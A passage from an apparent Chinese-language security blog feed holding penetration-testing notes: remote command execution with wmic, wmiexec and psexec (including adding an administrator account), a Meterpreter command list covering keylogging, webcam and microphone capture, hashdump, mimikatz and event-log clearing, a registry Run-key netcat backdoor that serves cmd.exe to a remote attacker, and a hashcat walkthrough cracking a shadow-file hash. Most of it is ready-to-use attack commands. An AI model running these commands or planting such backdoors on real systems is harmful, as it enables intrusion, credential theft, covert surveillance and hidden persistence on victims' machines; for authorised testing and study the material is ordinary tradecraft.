pgsql">wmic /node:<span class="hljs-number">170.170</span><span class="hljs-number">.64</span><span class="hljs-number">.19</span> /<span class="hljs-keyword">user</span>:<span class="hljs-keyword">admin</span> /<span class="hljs-keyword">password</span>:passwd process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c calc.exe&quot;<br><br>wmic /node:<span class="hljs-number">170.170</span><span class="hljs-number">.64</span><span class="hljs-number">.19</span> /<span class="hljs-keyword">user</span>:<span class="hljs-keyword">admin</span> /<span class="hljs-keyword">password</span>:passwd process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c net user test 123456 /add &amp;&amp; net localgroup administrators test /add&quot;<br></code></pre></td></tr></table></figure><h2 id="wmiexec-vbs-需要安装"><a href="#wmiexec-vbs-需要安装" class="headerlink" title="wmiexec.vbs(需要安装)"></a>wmiexec.vbs(需要安装)</h2><h3 id="前提-5"><a href="#前提-5" class="headerlink" title="前提"></a>前提</h3><p>开启wmi服务，135端口</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载vmiexec.vbs</p><h3 id="命令执行-3"><a href="#命令执行-3" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cscript<span class="hljs-selector-class">.exe</span> <span class="hljs-comment">//nologo wmiexec.vbs /shell 170.170.64.19 admin passwd</span><br>cscript<span class="hljs-selector-class">.exe</span> wmiexec<span class="hljs-selector-class">.vbs</span> /cmd <span class="hljs-number">170.170</span>.<span class="hljs-number">64.19</span> admin passwd <span class="hljs-string">&quot;cmdkey /list&quot;</span><br>cscript<span class="hljs-selector-class">.exe</span> wmiexec<span class="hljs-selector-class">.vbs</span> /cmd <span class="hljs-number">170.170</span>.<span class="hljs-number">64.19</span> admin passwd c:\programdata\test.bat<br>#其他参数<br>-wait5000 表示这个命令等待<span class="hljs-number">5s</span>后再读取结果，用于运行“运行时间长”的命令。<br>-persist 程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，用于运行 nc 或者木马程序。<br></code></pre></td></tr></table></figure><h2 id="impackets-wmiexec-需要安装"><a href="#impackets-wmiexec-需要安装" class="headerlink" title="impackets wmiexec(需要安装)"></a>impackets wmiexec(需要安装)</h2><h3 id="前提-6"><a href="#前提-6" class="headerlink" title="前提"></a>前提</h3><p>开启wmi服务，135端口</p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecureAuthCorp/im</span>packet/<br>pip install -r requirements.txt<br>pip install impacket<br></code></pre></td></tr></table></figure><h3 id="命令执行-4"><a href="#命令执行-4" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#获取远程计算机交互式shell</span><br><span class="hljs-attribute">python</span> wmiexec.py admin:passwd@<span class="hljs-number">170.170.64.19</span><br></code></pre></td></tr></table></figure><h2 id="psexec-需要安装"><a href="#psexec-需要安装" class="headerlink" title="psexec(需要安装)"></a>psexec(需要安装)</h2><h3 id="前提-7"><a href="#前提-7" class="headerlink" title="前提"></a>前提</h3><p>开启admin$共享</p><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>在 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a> 下载安装</p><h3 id="命令执行-5"><a href="#命令执行-5" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment">#打开交互式shell</span><br>psexec <span class="hljs-string">\\170.170.64.19</span> -u admin -p passwd cmd<br><span class="hljs-comment">#执行单条命令</span><br>psexec <span class="hljs-string">\\170.170.64.19</span> -u admin -p passwd -s cmd /c <span class="hljs-string">&quot;calc.exe&quot;</span><br><span class="hljs-comment">#拷贝文件到远程计算机并执行</span><br>psexec <span class="hljs-string">\\170.170.64.19</span> -u admin -p passwd -c C:<span class="hljs-string">\Users\Administrator\Desktop\GetHashes.exe</span><br><br><span class="hljs-comment">#其他参数</span><br>–accepteula 第一次运行会弹框,输入这个参数便不会弹框<br>-s 以 “nt authority<span class="hljs-string">\system”</span> 权限运行远程进程<br>-h 如果可以，以管理员权限运行远程进程<br>-d 不等待程序执行完就返回，请只对非交互式应用程序使用此选项<br><span class="hljs-string">\\ip</span> 可以替换成 @ip.txt (存放多个 ip 的文本)，可以批量执行命令<br></code></pre></td></tr></table></figure><h2 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h2><h3 id="前提-8"><a href="#前提-8" class="headerlink" title="前提"></a>前提</h3><p>开启远程桌面，3389端口</p><h3 id="命令执行-6"><a href="#命令执行-6" class="headerlink" title="命令执行"></a>命令执行</h3><p>可直接通过mstsc进入目标系统。</p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>meterpreter命令总结</title>
    <link href="/2020/08/04/meterpreter%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/"/>
    <url>/2020/08/04/meterpreter%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。Meterpreter功能强大，支持信息收集、提权、注册表操作、哈希利用、截屏录屏等操作，也支持对摄像头、录音设备、键盘鼠标的控制。</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">sessions -i 进入会话   <br>sessions -k 杀死会话<br>pwd         查看当前目录<br>getuid      查看当前用户信息<br>sysinfo     查看远程主机系统信息<br>execute     在目标主机上执行命令<br>hashdump    获取目标主机用户密码hash信息<br>getsystem   提升权限<br>shell       切换至传统shell<br>background  将当前session放入后台<br>kill        关闭进程<br>load        加载meterpreter扩展<br><span class="hljs-keyword">exit</span>        退出当前shell<br>arp         显示ARP缓存<br>getproxy    显示当前代理配置<br>ifconfig    显示接口<br>ipconfig    显示接口<br>netstat     显示网络连接<br>portfwd     将本地端口转发到远程服务<br>route       查看和修改路由<br>getenv      查看环境变量<br>getprivs    查看权限<br>pgrep       搜索进程<br>ps          查看当前运行进程<br>reboot      重启系统<br>reg         修改注册表<br>clearev     清除windows中的应用程序日志、系统日志、安全日志<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/meterpreter01.png"></p><h2 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span>           查看文件<br><span class="hljs-keyword">cd</span>            改变目录<br><span class="hljs-keyword">checksum</span>      校验文件md5或sha1<br>cp            拷贝文件<br>download      下载文件<br><span class="hljs-keyword">edit</span>          编辑文件<br><span class="hljs-keyword">ls</span>            列出文件<br><span class="hljs-keyword">mkdir</span>         创建文件夹<br>mv            移动文件<br><span class="hljs-keyword">rm</span>            删除文件<br><span class="hljs-keyword">rmdir</span>         删除文件夹<br><span class="hljs-keyword">search</span>        查找文件<br>show_mount    列出所有驱动器<br>upload        上传文件<br></code></pre></td></tr></table></figure><h2 id="用户设备命令"><a href="#用户设备命令" class="headerlink" title="用户设备命令"></a>用户设备命令</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">enumdesktops   列出所有可访问的桌面和窗口<br>getdesktop     获取当前桌面<br>idletime       获取远程系统已运行时间（从上次重新启动开始计算）<br>keyboard_send  发送击键<br>keyscan_dump   转储击键缓冲区<br>keyscan_start  开始捕获击键<br>keyscan_stop   停止捕获击键<br>mouse          发送鼠标事件<br><span class="hljs-keyword">screenshare </span>   实时观看远程用户的桌面<br><span class="hljs-keyword">screenshot </span>    截屏<br>setdesktop     更改<span class="hljs-keyword">shell当前桌面</span><br><span class="hljs-keyword">uictl </span>         控制用户界面组件<br>record_mic     记录麦克风一定秒数<br>webcam_chat    开始视频聊天<br>webcam_list    列出网络摄像头<br>webcam_snap    从指定网络摄像头拍摄<br>webcam_stream  播放指定网络摄像头的视频流<br>play           在目标系统播放音频<br></code></pre></td></tr></table></figure><h2 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">load mimikatz   加载mimikatz模块   <br><span class="hljs-built_in">help</span> mimikatz   查看帮助<br>wdigest         获取密码<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/meterpreter02.png"></p><h2 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">run</span> vnc 使用vnc连接远程桌面<br><span class="hljs-builtin-name">run</span> getgui -e 开启远程桌面<br><span class="hljs-builtin-name">run</span> post/windows/manage/enable_rdp 开启远程桌面<br><span class="hljs-builtin-name">run</span> post/windows/manage/enable_rdp <span class="hljs-attribute">USERNAME</span>=test <span class="hljs-attribute">PASSWORD</span>=123456 添加用户<br><span class="hljs-builtin-name">run</span> post/windows/manage/enable_rdp <span class="hljs-attribute">FORWARD</span>=<span class="hljs-literal">true</span> <span class="hljs-attribute">LPORT</span>=6662   将3389端口转发到6662<br></code></pre></td></tr></table></figure><h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/g</span>ather/checkvm <span class="hljs-comment">#是否虚拟机</span><br>run post<span class="hljs-regexp">/linux/g</span>ather/checkvm <span class="hljs-comment">#是否虚拟机</span><br>run post<span class="hljs-regexp">/windows/g</span>ather<span class="hljs-regexp">/forensics/</span>enum_drives <span class="hljs-comment">#查看分区</span><br>run post<span class="hljs-regexp">/windows/g</span>ather/enum_applications <span class="hljs-comment">#获取安装软件信息</span><br>run post<span class="hljs-regexp">/windows/g</span>ather/dumplinks   <span class="hljs-comment">#获取最近的文件操作</span><br>run post<span class="hljs-regexp">/windows/g</span>ather/enum_ie  <span class="hljs-comment">#获取IE缓存</span><br>run post<span class="hljs-regexp">/windows/g</span>ather/enum_chrome   <span class="hljs-comment">#获取Chrome缓存</span><br>run post<span class="hljs-regexp">/windows/g</span>ather/enum_patches  <span class="hljs-comment">#补丁信息</span><br>run post<span class="hljs-regexp">/windows/g</span>ather/enum_domain  <span class="hljs-comment">#查找域控</span><br></code></pre></td></tr></table></figure><h2 id="针对未安装补丁攻击"><a href="#针对未安装补丁攻击" class="headerlink" title="针对未安装补丁攻击"></a>针对未安装补丁攻击</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">run</span> <span class="hljs-keyword">post</span>/windows/gather/enum_patches  收集补丁信息<br>攻击：<br>msf &gt; <span class="hljs-keyword">use</span> exploit/windows/<span class="hljs-keyword">local</span>/xxxx<br>msf &gt; <span class="hljs-keyword">set</span> SESSION 2<br>msf &gt; exploit<br></code></pre></td></tr></table></figure><h2 id="注册表设置nc后门"><a href="#注册表设置nc后门" class="headerlink" title="注册表设置nc后门"></a>注册表设置nc后门</h2><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">upload /usr/share/windows-binaries/nc.exe C:<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>system32 #上传nc<br>reg enumkey -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>run   #枚举run下的key<br>reg setval -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>run -v lltest_nc -d &#x27;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\n</span>c.exe -Ldp 443 -e cmd.exe&#x27; #设置键值<br>reg queryval -k HKLM<span class="hljs-symbol">\\</span>software<span class="hljs-symbol">\\</span>microsoft<span class="hljs-symbol">\\</span>windows<span class="hljs-symbol">\\</span>currentversion<span class="hljs-symbol">\\</span>Run -v lltest_nc   #查看键值<br>nc -v 192.168.159.144 443  #攻击者连接nc后门<br></code></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><p>meterpreter help文件</p></li><li><p><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>metasploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>哈希密码爆破工具hashcat</title>
    <link href="/2020/07/28/%E5%93%88%E5%B8%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hashcat/"/>
    <url>/2020/07/28/%E5%93%88%E5%B8%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hashcat/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hashcat是世界上最快，最先进的密码恢复实用程序，为300多种高度优化的哈希算法提供了五种独特的攻击模式。hashcat支持Linux，Windows和macOS平台，且支持使用CPU，GPU和其他硬件加速器计算，并具有分布式密码破解的功能。</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>经典字典破解用法</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">hashcat</span> <span class="hljs-comment">testHashfile</span> --<span class="hljs-comment">hash</span><span class="hljs-literal">-</span><span class="hljs-comment">type</span> <span class="hljs-comment">0</span> --<span class="hljs-comment">attack</span><span class="hljs-literal">-</span><span class="hljs-comment">mode</span> <span class="hljs-comment">0</span> <span class="hljs-comment">passDic</span><span class="hljs-string">.</span><span class="hljs-comment">txt</span><br><span class="hljs-comment"></span><span class="hljs-literal">-</span><span class="hljs-comment">m，</span>--<span class="hljs-comment">hash</span><span class="hljs-literal">-</span><span class="hljs-comment">type选择哈希类型，</span><br><span class="hljs-comment">1000为windows</span> <span class="hljs-comment">nt</span> <span class="hljs-comment">hash</span><span class="hljs-string">,</span><span class="hljs-comment">1800是sha512</span> <span class="hljs-comment">Linux加密</span><span class="hljs-string">,</span><span class="hljs-comment">不指定</span><span class="hljs-literal">-</span><span class="hljs-comment">m默认为0即md5。</span><br><span class="hljs-comment"></span><span class="hljs-literal">-</span><span class="hljs-comment">a，</span>--<span class="hljs-comment">attack</span><span class="hljs-literal">-</span><span class="hljs-comment">mode选择模式</span><br><span class="hljs-comment">0</span> <span class="hljs-comment">=</span> <span class="hljs-comment">Straight</span> <span class="hljs-comment">（字典破解）</span><br><span class="hljs-comment">1</span> <span class="hljs-comment">=</span> <span class="hljs-comment">Combination</span> <span class="hljs-comment">（组合破解）</span><br><span class="hljs-comment">2</span> <span class="hljs-comment">=</span> <span class="hljs-comment">Toggle</span><span class="hljs-literal">-</span><span class="hljs-comment">Case</span> <span class="hljs-comment">（大小写转换）</span><br><span class="hljs-comment">3</span> <span class="hljs-comment">=</span> <span class="hljs-comment">Brute</span><span class="hljs-literal">-</span><span class="hljs-comment">force（掩码暴力破解）</span><br><span class="hljs-comment">4</span> <span class="hljs-comment">=</span> <span class="hljs-comment">Permutation（序列破解）</span><br><span class="hljs-comment">5</span> <span class="hljs-comment">=</span> <span class="hljs-comment">Table</span><span class="hljs-literal">-</span><span class="hljs-comment">Lookup（查表破解）</span><br><span class="hljs-comment">6</span> <span class="hljs-comment">=</span> <span class="hljs-comment">Hybrid</span> <span class="hljs-comment">dict</span> <span class="hljs-literal">+</span> <span class="hljs-comment">mask</span> <span class="hljs-comment">字典加掩码破解</span><br><span class="hljs-comment">7</span> <span class="hljs-comment">=</span> <span class="hljs-comment">Hybrid</span> <span class="hljs-comment">mask</span> <span class="hljs-literal">+</span> <span class="hljs-comment">dict</span> <span class="hljs-comment">掩码</span><span class="hljs-literal">+</span><span class="hljs-comment">字典破解</span><br><span class="hljs-comment">8</span> <span class="hljs-comment">=</span> <span class="hljs-comment">Prince（王子破解）</span><br><span class="hljs-comment"></span><span class="hljs-literal">-</span><span class="hljs-comment">b</span><span class="hljs-string">,</span> --<span class="hljs-comment">benchmark</span>   <span class="hljs-comment">测试计算机破解速度和显示硬件相关信息</span><br><span class="hljs-comment"></span><span class="hljs-literal">-</span><span class="hljs-comment">h，</span>--<span class="hljs-comment">help</span>   <span class="hljs-comment">帮助，可查看hashcat各参数的用法和可供破解的哈希类型编号</span><br><span class="hljs-comment"></span>--<span class="hljs-comment">quiet</span>    <span class="hljs-comment">静默模式</span><span class="hljs-string">,</span> <span class="hljs-comment">抑制输出</span><br><span class="hljs-comment"></span><span class="hljs-literal">-</span><span class="hljs-comment">n</span><span class="hljs-string">,</span> --<span class="hljs-comment">threads=NUM</span>    <span class="hljs-comment">线程数</span><br><span class="hljs-comment"></span><span class="hljs-literal">-</span><span class="hljs-comment">o</span><span class="hljs-string">,</span>  --<span class="hljs-comment">outfile=FILE</span>    <span class="hljs-comment">定义哈希文件恢复输出文件</span><br><span class="hljs-comment"></span>--<span class="hljs-comment">outfile</span><span class="hljs-literal">-</span><span class="hljs-comment">format=NUM</span>    <span class="hljs-comment">定义哈希文件输出格式，见下面的参考资料</span><br><span class="hljs-comment"></span>--<span class="hljs-comment">outfile</span><span class="hljs-literal">-</span><span class="hljs-comment">autohex</span><span class="hljs-literal">-</span><span class="hljs-comment">disable</span>    <span class="hljs-comment">禁止使用十六进制输出明文</span><br><span class="hljs-comment"></span>--<span class="hljs-comment">hex</span><span class="hljs-literal">-</span><span class="hljs-comment">salt</span>    <span class="hljs-comment">salt值是用十六进制给出的</span><br><span class="hljs-comment"></span>--<span class="hljs-comment">hex</span><span class="hljs-literal">-</span><span class="hljs-comment">charset</span>    <span class="hljs-comment">设定字符集是十六进制给出</span><br><span class="hljs-comment"></span>--<span class="hljs-comment">runtime=NUM</span>    <span class="hljs-comment">运行数秒（NUM值）后的中止会话</span><br><span class="hljs-comment"></span>--<span class="hljs-comment">status</span>    <span class="hljs-comment">启用状态屏幕的自动更新</span><br><span class="hljs-comment"></span>--<span class="hljs-comment">status</span><span class="hljs-literal">-</span><span class="hljs-comment">timer=NUM</span>    <span class="hljs-comment">状态屏幕更新秒值</span><br><span class="hljs-comment"></span>--<span class="hljs-comment">status</span><span class="hljs-literal">-</span><span class="hljs-comment">automat</span>    <span class="hljs-comment">以机器可读的格式显示状态视图</span><br><span class="hljs-comment"></span>--<span class="hljs-comment">session</span>   <span class="hljs-comment">后跟会话名称，主要用于中止任务后的恢复破解。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">内置的字符集:</span><br><span class="hljs-comment">?l</span> <span class="hljs-comment">=</span> <span class="hljs-comment">abcdefghijklmnopqrstuvwxyz</span> <span class="hljs-comment">代表小写字母</span><br><span class="hljs-comment">?u</span> <span class="hljs-comment">=</span> <span class="hljs-comment">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span> <span class="hljs-comment">代表大写字母</span><br><span class="hljs-comment">?d</span> <span class="hljs-comment">=</span> <span class="hljs-comment">0123456789</span> <span class="hljs-comment">代表数字</span><br><span class="hljs-comment">?s</span> <span class="hljs-comment">=</span> <span class="hljs-comment">!&quot;#$%&amp;&#x27;()*</span><span class="hljs-literal">+</span><span class="hljs-string">,</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-comment">/:;</span>&lt;<span class="hljs-comment">=</span>&gt;<span class="hljs-comment">?@</span><span class="hljs-title">[</span><span class="hljs-comment">\</span><span class="hljs-title">]</span><span class="hljs-comment">^_`&#123;|&#125;~</span>  <span class="hljs-comment">代表特殊字符</span><br><span class="hljs-comment">?a</span> <span class="hljs-comment">=</span> <span class="hljs-comment">?l?u?d?s</span> <span class="hljs-comment">大小写数字及特殊字符的组合</span><br><span class="hljs-comment">?b</span> <span class="hljs-comment">=</span> <span class="hljs-comment">0x00</span> <span class="hljs-literal">-</span> <span class="hljs-comment">0xff</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><p>本文使用最常用的两种加密：linux系统密码（sha512）和windows系统密码（NT<br> HASH）做实例，并使用最常用的两种攻击方式进行演示。</p><h3 id="字典破解linux系统密码"><a href="#字典破解linux系统密码" class="headerlink" title="字典破解linux系统密码"></a>字典破解linux系统密码</h3><p>查看linux hash的方式是打开/etc/shadow直接查看，/etc/shadow文件中每一行代表一个用户以及其密码hash以及密码配置信息，以如下格式分布。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">root:$<span class="hljs-number">6</span><span class="hljs-variable">$t3lLj7DjLuEnQHCy</span><span class="hljs-variable">$w</span><span class="hljs-selector-class">.xIeZPxn61ew</span>.<span class="hljs-number">17</span>w09qMXkg<span class="hljs-selector-class">.E4aXOM7IMjHJ7PRRiH7XSMaCdHI1Hc0pLyMqRZcafSZtz</span><span class="hljs-selector-class">.UEOb3nmYxyFxKm</span>.:<span class="hljs-number">18443</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br><br>用户名：加密密码：最后一次修改时间：最小修改时间间隔：密码有效期：密码需要变更前的警告天数：密码过期后的宽限时间：账号失效时间：保留字段<br></code></pre></td></tr></table></figure><p>其他字段都较好理解，其中加密密码和最后一次修改时间需要解释一下：</p><p>加密密码中如果第一个字符为!或者*的话，说明这是一个不能登录的账户，其他情况格式为$id$salt$encrypted</p><p>根据id可以判断加密方式，第二个$到第三个$之间的字段为salt，第三个$之后的字段为密码hash。</p><p>常见的情况</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>为<span class="hljs-number">1</span>时，采用md<span class="hljs-number">5</span>算法加密<br><span class="hljs-attribute">id</span>为<span class="hljs-number">5</span>时，采用SHA<span class="hljs-number">256</span>算法加密<br><span class="hljs-attribute">id</span>为<span class="hljs-number">6</span>时，采用SHA<span class="hljs-number">512</span>算法加密<br></code></pre></td></tr></table></figure><p>最后一次修改时间是从1970-01-01开始计算的，每天加1，所以会显示为这样一个数字，我们可使用如下命令计算修改时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@kali:~# date -d <span class="hljs-string">&quot;1970-01-01 18443 days&quot;</span><br><span class="hljs-attribute">2020</span>年 <span class="hljs-number">06</span>月 <span class="hljs-number">30</span>日 星期二 <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> CST<br></code></pre></td></tr></table></figure><p>了解了linux系统密码保存的情况，就可以提取出来使用hashcat破解，我们需要提取第二个冒号到第三个冒号之间的字段保存到一个文件root.txt中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$<span class="hljs-number">6</span><span class="hljs-variable">$t3lLj7DjLuEnQHCy</span><span class="hljs-variable">$w</span><span class="hljs-selector-class">.xIeZPxn61ew</span>.<span class="hljs-number">17</span>w09qMXkg<span class="hljs-selector-class">.E4aXOM7IMjHJ7PRRiH7XSMaCdHI1Hc0pLyMqRZcafSZtz</span><span class="hljs-selector-class">.UEOb3nmYxyFxKm</span>.<br></code></pre></td></tr></table></figure><p>然后使用准备好的字典top100.txt破解，将破解结果保存在result.txt中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">1800</span> -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> -o result<span class="hljs-selector-class">.txt</span> root<span class="hljs-selector-class">.txt</span> top100<span class="hljs-selector-class">.txt</span> --force<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/hashcat/hashcat01.png"></p><h3 id="掩码破解windows用户密码"><a href="#掩码破解windows用户密码" class="headerlink" title="掩码破解windows用户密码"></a>掩码破解windows用户密码</h3><p>查看windows hash的工具非常多，为了省事我直接使用前面文章介绍过的工具LaZagne 就不重复介绍新工具了 <a 